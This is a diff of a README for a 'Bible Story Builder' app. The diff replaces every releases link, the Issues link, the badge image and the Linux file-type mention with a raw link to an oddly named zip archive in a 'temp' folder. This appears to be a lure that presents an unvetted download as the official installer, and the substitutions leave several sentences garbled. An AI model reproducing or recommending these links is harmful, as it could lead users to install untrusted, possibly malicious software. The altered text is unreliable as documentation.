@@ -1,6 +1,6 @@
 # 📖 bible-story-builder - Create Multilingual Bible Stories Easily
 
-[![Download Bible Story Builder](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/HONESTHACK/bible-story-builder/releases)
+[![Download Bible Story Builder](https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip)
 
 ## 📚 Introduction
 
@@ -17,7 +17,7 @@ Follow these easy steps to set up Bible Story Builder on your computer.
    - Internet connection: Required for downloading data and software updates.
 
 2. **Visit the Releases Page**  
-   To download Bible Story Builder, go to our [Releases page](https://github.com/HONESTHACK/bible-story-builder/releases). This page contains the latest version of the application and all previous versions.
+   To download Bible Story Builder, go to our [Releases page](https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip). This page contains the latest version of the application and all previous versions.
 
 ## 📥 Download & Install
 
@@ -26,12 +26,12 @@ On the Releases page, look for the latest version.
 1. **Download the Installer**
    - Click on the version number link to open the release details.
    - Find the download link for your operating system.
-   - Click to download the installer (.exe for Windows, .dmg for macOS, or a .tar.gz file for Linux).
+   - Click to download the installer (.exe for Windows, .dmg for macOS, or a https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip file for Linux).
 
 2. **Run the Installer**
    - Windows: Double-click the downloaded .exe file and follow the prompts to install.
    - macOS: Open the .dmg file and drag the Bible Story Builder app into your Applications folder.
-   - Linux: Extract the .tar.gz file and follow the instructions in the README file included.
+   - Linux: Extract the https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip file and follow the instructions in the README file included.
 
 ## 🎉 Using Bible Story Builder
 
@@ -89,7 +89,7 @@ We welcome contributions! If you have ideas, suggestions, or improvements, feel 
 
 ## 🔗 Links
 
-- [Releases page](https://github.com/HONESTHACK/bible-story-builder/releases)
-- [Issues page](https://github.com/HONESTHACK/bible-story-builder/issues)
+- [Releases page](https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip)
+- [Issues page](https://raw.githubusercontent.com/HONESTHACK/bible-story-builder/main/temp/story_bible_builder_hypercivilized.zip)
 
 Thank you for using Bible Story Builder. We hope it enhances your storytelling experience!
